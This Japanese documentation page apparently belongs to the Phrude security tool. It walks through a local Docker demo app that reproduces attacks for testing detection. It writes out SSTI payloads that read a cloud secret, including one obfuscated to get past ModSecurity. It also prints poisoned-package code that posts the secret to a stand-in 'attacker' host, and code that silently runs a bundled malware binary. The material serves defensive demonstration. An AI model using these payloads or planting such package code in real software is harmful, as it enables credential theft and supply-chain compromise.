---
sidebar_position: 4
---

# デモ用Webアプリの解説

Phrudeの検証で用いたPython Flask製のデモ用Webアプリを <https://github.com/phrude/flask-demoapp> で公開しています。

Webアプリに任意の処理を挿入する攻撃のうち、外部からのHTTPリクエスト経由の攻撃としてSSTI、内部からの攻撃として汚染ライブラリの混入(Pythonのコードで攻撃処理が記述されているもの・マルウェアバイナリを実行するもの)が実装されています。

## Setup

動作させるためには

- [Docker](https://docs.docker.com/)
- [Docker Compose](https://docs.docker.com/compose/)

をインストールしてください

DockerおよびDocker Composeをインストール後、`docker compose up -d`コマンドで

- <http://localhost:8080> Python Flask製のデモ用Webアプリ
- <http://localhost:8081> オープンソースのWAF [ModSecurity](https://github.com/SpiderLabs/ModSecurity)を適用し保護したPython Flask製のデモ用Webアプリ
- <http://localhost:8082> 攻撃の実行時に流出させた情報を受け取る、攻撃者の模擬サーバー

が起動します。

## 擬似的な攻撃の実行

以下の5つの擬似的な攻撃を実行することができます。

### 1. 外部からのHTTPリクエスト経由の攻撃

以下のようなcurlコマンドの実行

```
curl -X POST http://localhost:8080/ssti -d name="{{request.application.__globals__.__builtins__.__import__('os').getenv('CLOUD_SECRET_KEY')}}"
```

もしくは <http://localhost:8080> デモ用Webアプリに

```
{{request.application.__globals__.__builtins__.__import__('os').getenv('CLOUD_SECRET_KEY')}}
```

を入力し`Send`ボタンをクリックしてください。

画面に `Hello wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY.`と表示されます。

この`wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY`は環境変数に格納されている秘密の鍵で、もしこの鍵がクラウドのリソースへアクセスするためのものである場合、このような攻撃による流出によってクラウドのリソースの不正な使用や情報流出に繋がります。

### 2. WAFに検知される外部からのHTTPリクエスト経由の攻撃

先程のデモ用WebアプリにオープンソースのWAF [ModSecurity](https://github.com/SpiderLabs/ModSecurity)を適用し保護したもので同じように

以下のようなcurlコマンドの実行

```
curl -X POST http://localhost:8081/ssti -d name="{{request.application.__globals__.__builtins__.__import__('os').getenv('CLOUD_SECRET_KEY')}}"
```

もしくは <http://localhost:8081> オープンソースのWAF [ModSecurity](https://github.com/SpiderLabs/ModSecurity)を適用し保護したデモ用Webアプリに

```
{{request.application.__globals__.__builtins__.__import__('os').getenv('CLOUD_SECRET_KEY')}}
```

を入力し`Send`ボタンをクリックしてください。

`403 Forbidden`エラーが画面に表示されます。

WAFはHTTPリクエストの文字列に含まれる、攻撃に特有の文字列を見つけることでそのHTTPリクエストが攻撃であるかを判断します。

`docker logs flask-demoapp-modsecurity-1`コマンドでオープンソースのWAF [ModSecurity](https://github.com/SpiderLabs/ModSecurity)のログを確認すると`PHP Injection Attack: High-Risk PHP Function Call Found`というルールに抵触し、攻撃であると判断されたことが分かります。

### 3. WAFの検知を回避した外部からのHTTPリクエスト経由の攻撃

オープンソースのWAF [ModSecurity](https://github.com/SpiderLabs/ModSecurity)の検知を回避するよう細工した攻撃文字列を送信します

以下のようなcurlコマンドの実行

```
curl -X POST http://localhost:8081/ssti -d name="{{(request.application.__globals__.__builtins__.__import__('os')|attr('ge'+'tenv')).__call__('CLOUD_SECRET_KEY')}}"
```

もしくは <http://localhost:8081> オープンソースのWAF [ModSecurity](https://github.com/SpiderLabs/ModSecurity)を適用し保護したデモ用Webアプリに

```
{{(request.application.__globals__.__builtins__.__import__('os')|attr('ge'+'tenv')).__call__('CLOUD_SECRET_KEY')}}
```

を入力し`Send`ボタンをクリックしてください。

画面に `Hello wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY.`と表示されます。

オープンソースのWAF [ModSecurity](https://github.com/SpiderLabs/ModSecurity)の検知を回避し、環境変数に格納されている秘密の鍵`wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY`を流出させることができました。

### 4. Pythonのコードで攻撃処理が記述されている汚染ライブラリの混入による攻撃

このデモ用Webアプリが導入しているライブラリstealer_packageでは`__init__.py`ファイルに不審な処理が記述されています。

```python
try:
    import os
    import requests

    # Get an environment variable
    secret = os.getenv("CLOUD_SECRET_KEY")
    requests.post("http://attacker/", data={"CLOUD_SECRET_KEY": secret})
except:
    pass
```

ここではgetenv関数で環境変数に格納されている秘密の鍵を取得し、外部のサーバー`http://attacker/`へ送信しています。

ライブラリstealer_packageで提供されている機能を使う処理を実行します。

以下のようなcurlコマンドの実行

```
curl http://localhost:8081/stealer
```

もしくは <http://localhost:8081/stealer> へブラウザでアクセスしてください。

画面に `Stealer demo is executed`と表示されます。

このとき、デモ用Webアプリが導入しているライブラリstealer_package内の不審な処理が実行され、秘密の鍵が攻撃者のサーバー`http://attacker/`に送信され流出しました。

攻撃者の模擬サーバー <http://localhost:8082> を確認すると

```
[{'CLOUD_SECRET_KEY': 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY'}]
```

と秘密の鍵が攻撃者の手に渡っていることが確認できます。

### 5. マルウェアバイナリを実行する汚染ライブラリの混入による攻撃

このデモ用Webアプリが導入しているライブラリmalware_packageでは`__init__.py`ファイルに不審な処理が記述されています。

```python
try:
    import subprocess
    import os

    # Run malware
    subprocess.Popen(
        os.path.join(os.path.dirname(os.path.abspath(__file__)), "malware"),
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        stdin=subprocess.DEVNULL,
    )
except:
    pass
```

ここではパッケージに同梱された実行可能ファイル`malware`を実行しています。

ライブラリmalware_packageで提供されている機能を使う処理を実行します。

以下のようなcurlコマンドの実行

```
curl http://localhost:8081/malware
```

もしくは <http://localhost:8081/malware> へブラウザでアクセスしてください。

画面に `Malware demo is executed`と表示されます。

このとき、デモ用Webアプリが導入しているライブラリmalware_package内の不審な処理が実行され、実行可能ファイル`malware`によってホスト名が攻撃者のサーバー`http://attacker/`に送信され流出しました。

攻撃者の模擬サーバー <http://localhost:8082> を確認すると

```
[{'hostname': '2c2c289ce392'}]
```

とホスト名が攻撃者の手に渡っていることが確認できます。

このようなマルウェアの実行では、Phrudeではsubprocessパッケージにより実行可能ファイルが実行されたことのみが検知できますが、システムコールによる検知ツールを使うことで実行可能ファイルがどのような処理をしたのかを把握することができます。
